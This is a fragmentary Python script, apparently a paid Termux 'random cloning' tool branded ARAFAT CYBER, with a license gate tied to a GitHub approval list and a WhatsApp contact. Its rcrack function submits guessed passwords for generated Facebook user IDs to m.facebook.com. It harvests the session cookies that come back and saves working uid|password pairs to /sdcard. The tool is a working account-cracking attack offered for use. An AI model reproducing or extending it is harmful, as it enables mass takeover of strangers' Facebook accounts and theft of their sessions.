import os
print("\033[1;92m [[[[+]]][[[+]]][[[+]]][[[+]]][[[+]]][[[+]]][[[+]]][[[+]]][[[+]]]] 𝐀𝐑𝐀𝐅𝐀𝐓 CYBER (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
os.system("pkg install espeak")
print("\033[1;92m   [[[[+]]][[[+]]][[[+]]][[[+]]][[[+]]][[[+]]][[[+]]][[[+]]][[[+]]]] ROBOT INSTALL COMPLETE \033[1;30m")
os.system('espeak -a 300 "Robot install complete"')
print("\033[1;92m   [[[[+]]][[[+]]][[[+]]][[[+]]][[[+]]][[[+]]][[[+]]][[[+]]][[[+]]]] UPDATE CHECKING BOSS 𝐀𝐑𝐀𝐅𝐀𝐓 CYBER KING 𝐀𝐑𝐀𝐅𝐀𝐓\033[1;30m")
os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH CYBER KING OFF 𝐀𝐑𝐀𝐅𝐀𝐓"')
os.system("git pull")
...
import os
os.system("pkg install espeak")
print("walcome to SEE Bangladesh 𝐀𝐑𝐀𝐅𝐀𝐓 cyber")
os.system("pkg install espeak")
from os import system as _Cyber_
def lo(word):
    ...
    for i in range(5):
        for x in range(len(𝐀𝐑𝐀𝐅𝐀𝐓)):
            sys.stdout.write(('\r{}{}').format(str(word), riyazu[x]))
            time.sleep(0.1)
            sys.stdout.flush()
def logo():
...
══════════════════════════════════════════════════════           
 [+] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 : AR AF AT
 [+] 𝐆𝐈𝐓𝐇𝐔𝐁  : cyber-arafat
 [+] 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 : 01749953660
 [+] 𝐓𝐎𝐎𝐥𝐒  :  Paid Random cloning 
══════════════════════════════════════════════════════""")
def linex():
	print('\033[1;94m✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺')
loop = 0
...
def xxr():
    ...
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m[\033[1;91m🔵\033[1;91m]\033[1;91m EXAMPLE : 2000, 3000, 5000, 10000\n \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥\n \033[1;91m[\033[1;97m🔵\033[1;91m]\033[38;5;46m PUT CLONING LIMIT: '))
...
def rcrack(uid,pwx,tl):
    ...
    'referer': 'https://m.facebook.com/googlechrome/?_se_imp=176fYf6pInJYAutrz',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[38;5;46m [𝐌𝐑•𝐀𝐑𝐀𝐅𝐀𝐓-OK💙] ' +uid+ ' | ' +ps+    '  \n \033[1;33m[√]\033[1;32mCookie = \033[38;5;46m'+coki+  '  ''  \033[1;34m')
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/𝐌𝐑•𝐀𝐑𝐀𝐅𝐀𝐓--OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[38;5;46m [𝐀𝐑𝐀𝐅𝐀𝐓•CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/\033[38;5;46𝐀𝐑𝐀𝐅𝐀𝐓.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['𝐀𝐑𝐀𝐅𝐀𝐓.143 CYBER','𝐀𝐑𝐀𝐅𝐀𝐓-CYBER ','𝐀𝐑𝐀𝐅𝐀𝐓 CRACK '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}𝐀𝐑𝐀𝐅𝐀𝐓-2F\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46m𝗕𝗢𝗦𝗦•𝐀𝐑𝐀𝐅𝐀𝐓💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
def superuser():
    ...
    id = "5".join(uuid)
    print (logo)
    DARK=requests.get('https://github.com/cyber-arafat/x-paid-pro/blob/main/Approval%20txt').text
    if id in DARK:
        xxr()
    else:
        os.system("clear")
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am ASSISTANT ROBOT OF my boss is ARAFAT Sir this tool is paid because 100% ok id just now login\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system('xdg-open https://wa.me/+8801749953660?text='+id)
        superuser()
xxr()